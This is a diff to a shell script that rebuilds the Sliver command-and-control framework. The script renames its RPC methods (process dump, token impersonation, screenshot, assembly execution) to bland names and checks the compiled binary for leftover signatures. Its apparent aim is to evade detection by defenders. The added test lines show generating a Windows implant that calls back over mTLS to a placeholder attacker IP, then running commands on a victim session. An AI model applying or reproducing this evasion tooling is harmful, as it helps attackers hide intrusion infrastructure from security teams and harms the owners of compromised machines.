@@ -170,7 +170,97 @@ echo "$FILES" | xargs -I {} sed -i \
     {}
 
 echo ""
-echo "[*] Step 5: Fixing CLI framework methods..."
+echo "[*] Step 5: Updating server RPC method implementations..."
+
+# Update server-side RPC method names to match new protobuf service definitions
+# Using a safer approach - individual replacements for each method
+echo "  [+] Updating server method implementations..."
+
+# Process each file individually with specific patterns
+find server/rpc -name "*.go" -type f | while read file; do
+    sed -i \
+        -e 's/func (rpc \*Server) Ps(/func (rpc *Server) SysProcList(/g' \
+        -e 's/func (s \*Server) Ps(/func (s *Server) SysProcList(/g' \
+        -e 's/func (rpc \*Server) Ls(/func (rpc *Server) FileDirList(/g' \
+        -e 's/func (s \*Server) Ls(/func (s *Server) FileDirList(/g' \
+        -e 's/func (rpc \*Server) Cd(/func (rpc *Server) FileDirChange(/g' \
+        -e 's/func (s \*Server) Cd(/func (s *Server) FileDirChange(/g' \
+        -e 's/func (rpc \*Server) Pwd(/func (rpc *Server) FileCurrentDir(/g' \
+        -e 's/func (s \*Server) Pwd(/func (s *Server) FileCurrentDir(/g' \
+        -e 's/func (rpc \*Server) Mkdir(/func (rpc *Server) FileMakeDir(/g' \
+        -e 's/func (s \*Server) Mkdir(/func (s *Server) FileMakeDir(/g' \
+        -e 's/func (rpc \*Server) Rm(/func (rpc *Server) FileRemove(/g' \
+        -e 's/func (s \*Server) Rm(/func (s *Server) FileRemove(/g' \
+        -e 's/func (rpc \*Server) Download(/func (rpc *Server) FileDownload(/g' \
+        -e 's/func (s \*Server) Download(/func (s *Server) FileDownload(/g' \
+        -e 's/func (rpc \*Server) Upload(/func (rpc *Server) FileUpload(/g' \
+        -e 's/func (s \*Server) Upload(/func (s *Server) FileUpload(/g' \
+        -e 's/func (rpc \*Server) Ifconfig(/func (rpc *Server) SysNetConfig(/g' \
+        -e 's/func (s \*Server) Ifconfig(/func (s *Server) SysNetConfig(/g' \
+        -e 's/func (rpc \*Server) Netstat(/func (rpc *Server) SysConnList(/g' \
+        -e 's/func (s \*Server) Netstat(/func (s *Server) SysConnList(/g' \
+        -e 's/func (rpc \*Server) ProcessDump(/func (rpc *Server) SysMemDump(/g' \
+        -e 's/func (s \*Server) ProcessDump(/func (s *Server) SysMemDump(/g' \
+        -e 's/func (rpc \*Server) Screenshot(/func (rpc *Server) SysScreenCapture(/g' \
+        -e 's/func (s \*Server) Screenshot(/func (s *Server) SysScreenCapture(/g' \
+        -e 's/func (rpc \*Server) Impersonate(/func (rpc *Server) SysTokenSwitch(/g' \
+        -e 's/func (s \*Server) Impersonate(/func (s *Server) SysTokenSwitch(/g' \
+        -e 's/func (rpc \*Server) Migrate(/func (rpc *Server) ProcMigrate(/g' \
+        -e 's/func (s \*Server) Migrate(/func (s *Server) ProcMigrate(/g' \
+        -e 's/func (rpc \*Server) Execute(/func (rpc *Server) CmdExecute(/g' \
+        -e 's/func (s \*Server) Execute(/func (s *Server) CmdExecute(/g' \
+        -e 's/func (rpc \*Server) ExecuteAssembly(/func (rpc *Server) CmdExecuteAssembly(/g' \
+        -e 's/func (s \*Server) ExecuteAssembly(/func (s *Server) CmdExecuteAssembly(/g' \
+        -e 's/func (rpc \*Server) ExecuteWindows(/func (rpc *Server) CmdExecuteWindows(/g' \
+        -e 's/func (s \*Server) ExecuteWindows(/func (s *Server) CmdExecuteWindows(/g' \
+        "$file"
+done
+
+# Update internal RPC method calls within server code
+echo "  [+] Updating internal server method calls..."
+find server/rpc -name "*.go" -exec sed -i \
+    -e 's/rpc\.Execute(/rpc.CmdExecute(/g' \
+    -e 's/rpc\.ExecuteAssembly(/rpc.CmdExecuteAssembly(/g' \
+    -e 's/rpc\.ExecuteWindows(/rpc.CmdExecuteWindows(/g' \
+    -e 's/rpc\.Upload(/rpc.FileUpload(/g' \
+    -e 's/rpc\.Download(/rpc.FileDownload(/g' \
+    -e 's/rpc\.Ls(/rpc.FileDirList(/g' \
+    -e 's/rpc\.Cd(/rpc.FileDirChange(/g' \
+    -e 's/rpc\.Pwd(/rpc.FileCurrentDir(/g' \
+    -e 's/rpc\.Mkdir(/rpc.FileMakeDir(/g' \
+    -e 's/rpc\.Rm(/rpc.FileRemove(/g' \
+    -e 's/rpc\.Ps(/rpc.SysProcList(/g' \
+    -e 's/rpc\.Ifconfig(/rpc.SysNetConfig(/g' \
+    -e 's/rpc\.Netstat(/rpc.SysConnList(/g' \
+    -e 's/rpc\.ProcessDump(/rpc.SysMemDump(/g' \
+    -e 's/rpc\.Screenshot(/rpc.SysScreenCapture(/g' \
+    -e 's/rpc\.Impersonate(/rpc.SysTokenSwitch(/g' \
+    -e 's/rpc\.Migrate(/rpc.ProcMigrate(/g' \
+    {} +
+
+# Also check for 's.' pattern (if receiver is named 's')
+find server/rpc -name "*.go" -exec sed -i \
+    -e 's/\bs\.Execute(/s.CmdExecute(/g' \
+    -e 's/\bs\.ExecuteAssembly(/s.CmdExecuteAssembly(/g' \
+    -e 's/\bs\.ExecuteWindows(/s.CmdExecuteWindows(/g' \
+    -e 's/\bs\.Upload(/s.FileUpload(/g' \
+    -e 's/\bs\.Download(/s.FileDownload(/g' \
+    -e 's/\bs\.Ls(/s.FileDirList(/g' \
+    -e 's/\bs\.Cd(/s.FileDirChange(/g' \
+    -e 's/\bs\.Pwd(/s.FileCurrentDir(/g' \
+    -e 's/\bs\.Mkdir(/s.FileMakeDir(/g' \
+    -e 's/\bs\.Rm(/s.FileRemove(/g' \
+    -e 's/\bs\.Ps(/s.SysProcList(/g' \
+    -e 's/\bs\.Ifconfig(/s.SysNetConfig(/g' \
+    -e 's/\bs\.Netstat(/s.SysConnList(/g' \
+    -e 's/\bs\.ProcessDump(/s.SysMemDump(/g' \
+    -e 's/\bs\.Screenshot(/s.SysScreenCapture(/g' \
+    -e 's/\bs\.Impersonate(/s.SysTokenSwitch(/g' \
+    -e 's/\bs\.Migrate(/s.ProcMigrate(/g' \
+    {} +
+
+echo ""
+echo "[*] Step 6: Fixing CLI framework methods..."
 
 # Fix CLI Execute methods that should NOT have been renamed
 echo "  [+] Restoring CLI framework Execute() methods..."
@@ -189,7 +279,7 @@ echo "$FILES" | xargs -I {} sed -i \
     {}
 
 echo ""
-echo "[*] Step 6: Restoring standard library calls..."
+echo "[*] Step 7: Restoring standard library calls..."
 
 # CRITICAL: Restore any standard library calls that got renamed
 echo "  [+] Restoring os.* and filepath.* calls..."
@@ -212,7 +302,7 @@ echo "$FILES" | xargs -I {} sed -i \
     {}
 
 echo ""
-echo "[*] Step 7: Compiling Sliver..."
+echo "[*] Step 8: Compiling Sliver..."
 echo ""
 
 if make; then
@@ -227,7 +317,6 @@ if make; then
     ls -lh sliver-server sliver-client 2>/dev/null
     echo ""
     echo "Verify modifications:"
-    echo "  cd $INSTALL_DIR"
     if strings sliver-server | grep -q "\.sliverpb\.ScreenshotReq\|\.sliverpb\.ProcessDumpReq\|\.sliverpb\.ImpersonateReq"; then
         echo "  ❌ WARNING: Old signatures still present"
     else
@@ -242,8 +331,11 @@ if make; then
     echo "  cd $INSTALL_DIR"
     echo "  ./sliver-client"
     echo ""
-    echo "Test generation:"
+    echo "Test commands:"
     echo "  sliver > generate --os windows --mtls <YOUR_IP> --save test.exe"
+    echo "  sliver > use <session>"
+    echo "  sliver (SESSION) > ps"
+    echo "  sliver (SESSION) > ifconfig"
     echo ""
     echo "Backup location: $INSTALL_DIR/protobuf.backup.original"
     echo ""
